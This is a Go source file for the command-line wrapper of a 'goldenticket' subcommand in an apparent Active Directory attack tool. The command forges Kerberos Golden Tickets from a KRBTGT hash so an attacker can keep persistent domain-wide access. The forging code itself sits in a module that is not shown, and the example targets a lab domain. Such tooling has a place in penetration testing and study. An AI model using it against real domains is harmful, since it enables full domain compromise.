// cmd/adgo/commands/goldenticket.go
package commands

import (
	"adgo/pkg/exploits"
	"fmt"

	"github.com/spf13/cobra"
)

var goldenTicketCmd = &cobra.Command{
	Use:   "goldenticket",
	Short: "Create a Golden Ticket",
	Long: `Create a Kerberos Golden Ticket using the KRBTGT hash.

A Golden Ticket allows complete domain persistence by forging TGTs.
Requires the domain KRBTGT account hash (typically obtained via DCSync).

Example:
  adgo kerberos goldenticket -d lab.local -u administrator --sid S-1-5-21-... --krbtgt-hash <hash>`,
	RunE: runGoldenTicket,
}

var (
	gtDomain     string
	gtUsername   string
	gtSID        string
	gtKRBTGTHash string
	gtTargetSPN  string
	gtOutputFile string
)

func init() {
	KerberosCmd.AddCommand(goldenTicketCmd)

	goldenTicketCmd.Flags().StringVarP(&gtDomain, "domain", "d", "", "Domain name (required)")
	goldenTicketCmd.Flags().StringVarP(&gtUsername, "username", "u", "", "Username for the ticket (required)")
	goldenTicketCmd.Flags().StringVar(&gtSID, "sid", "", "Domain SID (required)")
	goldenTicketCmd.Flags().StringVar(&gtKRBTGTHash, "krbtgt-hash", "", "KRBTGT NT hash (required)")
	goldenTicketCmd.Flags().StringVar(&gtTargetSPN, "spn", "", "Target SPN (optional)")
	goldenTicketCmd.Flags().StringVarP(&gtOutputFile, "output", "o", "", "Output ticket file (.ccache)")

	goldenTicketCmd.MarkFlagRequired("domain")
	goldenTicketCmd.MarkFlagRequired("username")
	goldenTicketCmd.MarkFlagRequired("sid")
	goldenTicketCmd.MarkFlagRequired("krbtgt-hash")
}

func runGoldenTicket(cmd *cobra.Command, args []string) error {
	fmt.Println("\n=== Golden Ticket Creation ===")
	fmt.Printf("[*] Creating Golden Ticket for %s@%s\n", gtUsername, gtDomain)
	fmt.Printf("[*] Domain SID: %s\n", gtSID)

	gt := exploits.NewGoldenTicket(gtDomain, gtUsername, gtSID, gtKRBTGTHash, gtTargetSPN)

	if err := gt.Create(); err != nil {
		return fmt.Errorf("Golden Ticket creation failed: %v", err)
	}

	if gtOutputFile != "" {
		fmt.Printf("[+] Ticket saved to: %s\n", gtOutputFile)
		fmt.Printf("[*] Usage: export KRB5CCNAME=%s\n", gtOutputFile)
	}

	return nil
}
